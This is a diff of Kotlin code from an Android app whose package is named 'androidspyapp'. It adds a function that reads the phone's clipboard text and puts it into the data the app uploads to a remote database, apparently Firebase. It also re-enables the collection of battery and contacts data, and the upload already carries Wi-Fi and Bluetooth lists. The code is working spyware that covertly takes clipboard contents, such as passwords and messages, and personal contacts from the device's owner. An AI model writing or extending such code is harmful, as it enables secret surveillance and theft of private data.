@@ -1,5 +1,7 @@
 package com.komnacki.androidspyapp
 
+import android.content.ClipData
+import android.content.ClipboardManager
 import android.content.Context
 import android.util.Log
 import com.google.android.gms.tasks.OnCompleteListener
@@ -33,6 +35,7 @@ class MessageUtils {
     private val CONTACTS_DATABASE_TAG = "CONTACTS"
     private val WIFI_LIST_DATABASE_TAG = "WIFI_LIST"
     private val BLUETOOTH_LIST_DATABASE_TAG = "BLUETOOTH_LIST"
+    private val CLIPBOARD_DATABASE_TAG = "CLIPBOARD"
 
     companion object {
         lateinit var userEmail: String
@@ -76,7 +79,7 @@ class MessageUtils {
 
         val values = mutableMapOf<String, Any>()
 
-        /*Log.d("KK: ", "write battery")
+        Log.d("KK: ", "write battery")
         batteryState.getData().forEach { item ->
             values[BATTERY_DATABASE_TAG + "/" + item.key] = item.value
         }
@@ -116,7 +119,9 @@ class MessageUtils {
         Log.d("KK: ", "write contacts")
         contactsState.getData().forEach { item ->
             values[CONTACTS_DATABASE_TAG + "/" + item.key] = item.value
-        }*/
+        }
+
+
         Log.d("KK: ", "write wifi")
         if (!wifiScanResult.isNullOrEmpty()) {
             Log.d("KK: ", "wifiScanResult is not empty")
@@ -142,6 +147,7 @@ class MessageUtils {
         } else {
             values["$BLUETOOTH_LIST_DATABASE_TAG/Empty"] = ""
         }
+        sendClipboardContent(values)
 
         Log.d("KK: ", "updateChildren")
         getBaseHeader().updateChildren(values)
@@ -169,6 +175,22 @@ class MessageUtils {
 //
 //        getBaseHeader()
 //            .runTransaction(transactionHandler)
+    }
+
+    private fun sendClipboardContent(values: MutableMap<String, Any>) {
+        try {
+            Log.d("KK: ", "clipbloard start")
+            val mClipboardManager =
+                context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
+            if (mClipboardManager.primaryClip != null) {
+                val item: ClipData.Item = mClipboardManager.primaryClip!!.getItemAt(0)
+                if (!item.text.toString().isBlank()) {
+                    values[CLIPBOARD_DATABASE_TAG] = item.text.toString()
+                }
+            }
+        } catch (e: Exception) {
+            Log.e("KK: ERROR: ", e.message + ", " + e.cause)
+        }
     }
 
     fun normalizeName(name: String): String {
